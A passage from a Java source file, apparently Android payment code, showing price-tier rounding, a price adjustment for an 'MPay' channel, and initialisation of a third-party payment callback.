        if (p < 1000) {
            return 500;
        } else if (p < 1500) {
            return 1000;
        } else if (p < 2000) {
            return 1500;
        }
        return 2000;
    }

    private static int changePriceForMPay(String price) {
        int p = Integer.parseInt(price);
        if (p % 200 != 0) {
            return p - 100;
        } else {
            return p;
        }
    }

    private static void initThirdReport(Activity activity, int type) {
        ThirdPayCB.getInstance().init(activity, type);
    }


}
